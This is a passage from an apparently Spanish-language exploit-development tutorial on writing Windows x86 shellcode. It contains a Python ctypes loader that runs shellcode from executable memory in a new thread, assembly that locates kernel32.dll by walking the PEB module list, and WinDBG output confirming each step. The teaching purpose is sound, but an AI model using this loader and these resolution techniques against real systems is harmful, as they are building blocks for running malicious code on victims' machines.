</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>3000</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>40</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">c_char</span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-group z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">from_buffer</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">windll</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">kernel32</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">RtlMoveMemory</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ptr</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Shellcode located at address <span class="z-constant z-other z-placeholder z-python">%s</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">%</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">hex</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ptr</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">input</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">...ENTER TO EXECUTE SHELLCODE...<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ht</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">windll</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">kernel32</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">CreateThread</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ptr</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">pointer</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">windll</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">kernel32</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">WaitForSingleObject</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ht</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">c_int</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-keyword z-operator z-arithmetic z-python">-</span><span class="z-constant z-numeric z-integer z-decimal z-python">1</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></code></pre>
<p>Nuestro shellcode inicia con <code>int3</code>, que es un punto de interrupción para facilitar la depuración.</p>
<p>Después movemos <code>esp</code> a <code>ebp</code> y reservamos un tamaño de <code>0x60</code> en <code>esp</code>.</p>
<p>Esto emula una llamada a una función real en la que el registro ESP se mueve al registro EBP para facilitar el acceso a lso argumentos pasados por la función. Restamos un desplazamiento arbitrario para que la pila no se sature.</p>
<p>Se define la funcón <code>find_kernel32</code>:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_kernel32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>          <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> null
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, fs:[ecx+30h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> PEB       
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+0Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> PEB -&gt; Ldr    
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+1Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Ldr -&gt; InInitializationOrderModuleList
</span></span></code></pre>
<p>Con <code>xor ecx, ecx</code>, se establece el registro a 0, el cuál se va a usar como desplazamiento, despues se mueve el PEB a esi y almacena el puntero ahí, una vez que esi tiene el puntero del PEB, lo desreferenciamos con el desplazamiento <code>0x0c</code> que es el de Ldr, el puntero de Ldr está almacenado en ESI, por lo que se hace de nuevo otra desreferencia para almacenar el desplazamiento <code>0x1c</code> para obtener la entrada de <code>InInitializationOrderModuleList</code>.</p>
<p>Implementamos otra función, <code>next_module</code>:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">next_module:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebx, [esi+8h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>   base_name
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov edi, [esi+20h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>   module_name
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>   Siguiente (flink) 
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cmp [edi+12*2], cx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>   (unicode) module_name[12] == 0x00? 
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jne next_module;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>   No? -&gt; siguiente modulo  
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></code></pre>
<p>Esta función es la encargada de transferir la dirección base a EBX y la dirección del nombre a EDI, la tercera instrucción asigna a esi la siguient entrada de <code>InInitializationOrderModuleList</code> mediante el uso de <code>flink</code>.</p>
<p>Finalmente se compara <code>edi + 24</code> con <code>cx</code> que establecimos en null(0), esto lo que quiere decir esque si encuentra una cadena de 24 caracteres con terminador nulo parará.</p>
<p>La razón por la cual se busca esto es por <code>kernel32.dll</code>, que tiene una longitud de 12 bytes. Pero dado que la cadena se almacena en formato unicode, cada carácter se representará como una palabra en lugar de un byte, lo que dará una longitud de 24 caracteres en unicode.</p>
<p>Es decir, si encontramos una cadena unicode de 25 caracteres, habremos encontrado una cadena de 12 caracteres.</p>
<p>Si la comparación falla saltará al siguiente modulo y se verificará de nuevo la siguiente entrada hasta que la comparación tenga éxito.</p>
<p>Debido a que <code>InInitializationOrderModuleList</code> muestra los módulos según el orden en que se inicializaron, el primer nombre de módulo que coincida con la comparación siempre será kernel32.dll, ya que es uno de los primeros en inicializarse.</p>
<p>Para confirmar que nuestro shellcode funciona correctamente, adjuntémoslo a WinDBG:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; u @eip l10
</span><span class="z-text z-plain">013c0000 cc              int     3
</span><span class="z-text z-plain">013c0001 89e5            mov     ebp,esp
</span><span class="z-text z-plain">013c0003 83ec60          sub     esp,60h
</span><span class="z-text z-plain">013c0006 31c9            xor     ecx,ecx
</span><span class="z-text z-plain">013c0008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
</span><span class="z-text z-plain">013c000c 8b760c          mov     esi,dword ptr [esi+0Ch]
</span><span class="z-text z-plain">013c000f 8b761c          mov     esi,dword ptr [esi+1Ch]
</span><span class="z-text z-plain">013c0012 8b5e08          mov     ebx,dword ptr [esi+8]
</span><span class="z-text z-plain">013c0015 8b7e20          mov     edi,dword ptr [esi+20h]
</span><span class="z-text z-plain">013c0018 8b36            mov     esi,dword ptr [esi]
</span><span class="z-text z-plain">013c001a 66394f18        cmp     word ptr [edi+18h],cx
</span><span class="z-text z-plain">013c001e 75f2            jne     013c0012
</span><span class="z-text z-plain">013c0020 c3              ret
</span></code></pre>
<p>Pondremos un breakpoint en la primera entrada de <code>InInitializationOrderModuleList</code>, que sería la dirección de memoria <code>013c001a</code>, donde se realiza la comparación.</p>
<pre class="z-code"><code><span class="z-text z-plain">...
</span><span class="z-text z-plain">0:004&gt; r @ebx
</span><span class="z-text z-plain">ebx=77010000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; du @edi
</span><span class="z-text z-plain">77019314  &quot;ntdll.dll&quot;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; lm m ntdll
</span><span class="z-text z-plain">Browse full module list
</span><span class="z-text z-plain">start    end        module name
</span><span class="z-text z-plain">77010000 771af000   ntdll      (pdb symbols)          C:\ProgramData\Dbg\sym\ntdll.pdb\EBAE1381C11394FF20DD5EFC34E32FD91\ntdll.pdb
</span></code></pre>
<p>El snippet anterior, muestra la dirección base de <code>ntdll.dll</code>, podemos confirmar que es la primera entrada.</p>
<p>Además hemos comprobado que la resolución de dirección base obtenida de <code>_LDR_DATA_TABLE_ENTRY_</code> es correcta.</p>
<p>Como este módulo no es el que estamos buscando, se realizará un salto condicional <code>jnz</code> (jump if zero) hasta que se encuentre la dirección base de <strong>Kernel32</strong>. Elimanos el punto de interrupción puesto anteriormente, y dejemos que la ejecución continúe.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">(1670.27ac): Access violation - code c0000005 (first chance)
</span><span class="z-text z-plain">First chance exceptions are reported before any exception handling.
</span><span class="z-text z-plain">This exception may be expected and handled.
</span><span class="z-text z-plain">eax=0317fd90 ebx=76f70000 ecx=00000000 edx=013c0000 esi=013d5ce8 edi=013d2328
</span><span class="z-text z-plain">eip=00000000 esp=0317fcdc ebp=0317fd38 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
</span><span class="z-text z-plain">00000000 ??              ???
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; r @ebx 
</span><span class="z-text z-plain">ebx=76f70000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; du @edi
</span><span class="z-text z-plain">013d2328  &quot;KERNEL32.DLL&quot;
</span></code></pre>
<p>Recordemos que <code>edi</code>, almacenaba el nombre de la dirección resuelta, tras esto vemos que hemos obtenido de forma correcta la dirección base de <code>kernel32.dll</code> analizando la lista dobleblemente enlazada <code>InInitializationOrderModuleList</code>.</p>
<h2 id="resolucion-de-simbolos">Resolución de símbolos<a class="zola-anchor" href="#resolucion-de-simbolos" aria-label="Anchor link for: resolucion-de-simbolos" style="visibility: hidden;"></a>
</h2>
<p>Una vez que hemos obtenido la dirección de Kernel32, el siguiente paso es resolver las APIs que exporta.</p>
<p>Anteriormente, mencionamos que<code>GetProcAddress</code>, nos da la capacidad de poder localizar funciones exportadas, pero también debe localizarse antes de poder usar.</p>
<p>En lugar de usar esta API, buscaremos en la tabla de direcciones de exportación (EAT) en busca de una equivalente.</p>
<p>La EAT es una estructura en una DLL que expone funciones que esa DLL ofrece a otros módulos.</p>
<p>Por ejemplo <code>LoadLibrary</code> está exportada por <code>kernel32.dll</code> o <code>ntdll.dll</code> y viven en su EAT.</p>
<h3 id="exportar-tabla-de-directorios">Exportar tabla de directorios<a class="zola-anchor" href="#exportar-tabla-de-directorios" aria-label="Anchor link for: exportar-tabla-de-directorios" style="visibility: hidden;"></a>
</h3>
<p>La forma más confiable de resolver símbolos de <code>kernel32.dll</code> y otras DLL, es utilizando el método EAT.</p>
<p><em>Símbolos, se refiere a los nombres de la funciones y sus direcciones de memoria iniciables.</em></p>
<p>Generalmente, las DLL que exportan funciones tiene una EAT que contiene información sobre los símbolos:</p>
<ul>
<li>Número de símbolos exportados</li>
<li>Dirección virtual relativa (RVA) del arreglo de funciones exportadas.</li>
<li>RVA del arreglo de nombres exportados.</li>
<li>RVA del arreglo ordinales exportados.</li>
</ul>
<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-storage z-type z-c">typedef</span> <span class="z-storage z-type z-c">struct</span> _IMAGE_EXPORT_DIRECTORY <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
